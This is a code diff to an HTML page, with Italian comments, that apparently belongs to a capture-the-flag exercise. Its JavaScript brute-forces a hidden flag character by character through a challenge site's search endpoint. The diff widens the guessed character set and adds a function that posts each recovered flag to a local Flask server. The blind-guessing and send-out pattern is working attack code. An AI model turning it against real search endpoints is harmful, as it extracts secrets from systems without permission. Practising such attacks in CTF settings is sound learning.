@@ -7,9 +7,29 @@
     <script>
         async function bruteForceFlag() {
             const baseUrl = 'https://matrix.capturetheflags.site/search?s=';
-            const characters = 'abcdefghijklmnopqrstuvwxyz0123456789'; // Modifica se necessario
+            const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+[]{}|;:,.<>?'; // Includi caratteri speciali
             let currentFlag = 'flag{'; // Inizia con la parte fissa della flag
             let found = false;
+
+            // Funzione per inviare la flag trovata al server Flask
+            async function sendFlag(flag) {
+                try {
+                    const response = await fetch('http://localhost:5000/submit_flag', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ flag }),
+                    });
+                    if (response.ok) {
+                        console.log('Flag inviata al server:', flag);
+                    } else {
+                        console.error('Errore nell\'invio della flag:', response.status);
+                    }
+                } catch (error) {
+                    console.error('Errore nella richiesta:', error);
+                }
+            }
 
             // Funzione ricorsiva per il brute force
             async function search(index) {
@@ -22,6 +42,7 @@
                             currentFlag += char + '}'; // Aggiungi il carattere e chiudi la flag
                             found = true; // Segna come trovata
                             console.log('Flag trovata:', currentFlag);
+                            await sendFlag(currentFlag); // Invia la flag al server Flask
                             break; // Esci dal ciclo
                         }
                     }
